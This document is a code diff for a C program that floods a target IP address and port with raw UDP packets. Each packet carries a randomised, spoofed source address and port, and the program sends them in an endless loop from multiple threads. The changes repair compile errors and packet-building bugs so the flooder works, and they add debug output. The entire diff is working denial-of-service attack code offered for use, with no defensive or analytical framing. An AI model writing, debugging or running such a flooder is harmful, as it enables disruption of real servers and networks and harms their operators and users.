@@ -94,15 +94,17 @@ void udp_flooding() {
 
     // allocate
     sa = (struct sockaddr_in*) malloc (sizeof(struct sockaddr_in));
-    udph = （struct udphdr*) malloc (sizeof(struct udphdr));
+    udph = (struct udphdr*) malloc (sizeof(struct udphdr) + sizeof(datagram));
     iph = (struct iphdr*) malloc (sizeof(struct iphdr));
-    fakeh = (FAKE_H*) malloc (sizeof(FAKE_H));
+    fakeh = (FAKE_H*) malloc (sizeof(struct FAKE_Header));
 
     // initialize
     memset(sa, 0, sizeof(struct sockaddr_in));
     memset(iph, 0, sizeof(struct iphdr));
     memset(udph, 0, sizeof(struct udphdr));
-    memset(fakeh, 0, sizeof(FAKE_H));
+    memset(fakeh, 0, sizeof(struct FAKE_Header));
+
+    printf("%d %d %d\n", sizeof(iph), sizeof(udph), sizeof(data));
 
     sa->sin_family = AF_INET;
     sa->sin_addr.s_addr = inet_addr(dstIP);
@@ -115,8 +117,8 @@ void udp_flooding() {
 
     while(1) {
         rand_ip(0, srcIP);
-        data = datagram + sizeof(struct iphdr) + sizseof(struct udphdr);
-        strcpy(data, "ABCADFJADFJKAD");
+        data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
+        strcpy(data, "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
         int PACKET_SIZE = sizeof(struct udphdr) + sizeof(struct iphdr) + strlen(data);
 
         iph->ihl = 5;
@@ -130,9 +132,10 @@ void udp_flooding() {
         iph->check = 0;
         iph->saddr = inet_addr(srcIP);
         iph->daddr = inet_addr(dstIP);
+        iph->check = 0;
         iph->check = check_sum((unsigned short*) datagram, iph->tot_len);
 
-        int sPort = rand16b(frand);
+        int sPort = rand_port();
         udph->source = htons (sPort);
         udph->dest = htons (dstPort);
         udph->len = htons(8 + strlen(data)); //udp header size
@@ -144,27 +147,31 @@ void udp_flooding() {
         fakeh->protocol = IPPROTO_UDP;
         fakeh->udp_len = htons(sizeof(struct udphdr) + strlen(data));
 
-        int psize = sizeof(FAKE_Header) + sizeof(struct udphdr) + strlen(data);
+        int psize = sizeof(struct FAKE_Header) + sizeof(struct udphdr) + strlen(data);
         char fakeDatagram[psize];
-        memcpy(fakeDatagram, (char*) &fakeh, sizeof(struct FAKE_HEADER));
-        memcpy(fakeDatagram + sizeof(struct FAKE_HEADER), udph, sizeof(struct udphdr) + strlen(data));
+        memcpy(fakeDatagram, (char*) &fakeh, sizeof(struct FAKE_Header));
+        memcpy(fakeDatagram + sizeof(struct FAKE_Header), udph, sizeof(struct udphdr) + strlen(data));
         udph->check = check_sum((unsigned short*) fakeDatagram, psize);
 
-        if (sendto(sa, datagram, iph->tot_len, 0, (struct sockaddr*) &sin, sizeof(sin)) <0 ) {
+        memcpy((void*)datagram, (void*)iph, sizeof(struct iphdr));
+        memcpy((void*)datagram + sizeof(struct iphdr), (void*)udph, sizeof(struct udphdr));
+
+        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) sa, sizeof(struct sockaddr)) <0 ) {
             perror("Error with sending...\n");
         } else {
             printf("Sent out!! Thread %d -> Packet %d ...", getuid(), ++packet_count);
-            printf("srdIP:%s:%d\t", srcIP, ntohs(udp_h->source));
-            printf("dstIP:%s:%d\n", dstIP, ntohs(udp_h->dest));  
+            printf("srdIP:%s:%d\t", srcIP, ntohs(udph->source));
+            printf("dstIP:%s:%d\n", dstIP, ntohs(udph->dest));  
+                        printf("%d\n", iph->tot_len);
+
         }
-
     }
-
+    close(s);
 }
 
 void attack() {
     int err;
-    pthread_t pthread[MAX];
+    pthread_t pthread[MAXCHILD];
     for (int i = 0; i < MAXCHILD; i++) {
         err = pthread_create(&pthread[i], NULL, udp_flooding);
         if (err != 0) {
@@ -186,8 +193,10 @@ int main (int argc, char* argv[]) {
     srcIP = (char*) malloc(sizeof(20));
     strcpy(dstIP, argv[1]);
     dstPort = atoi(argv[2]);
+    printf("%s %d\n", dstIP, dstPort);
     srand(time(NULL));
     fastrand(time(NULL));
-    attack();
+    // attack();
+    udp_flooding();
     return 0;
 }
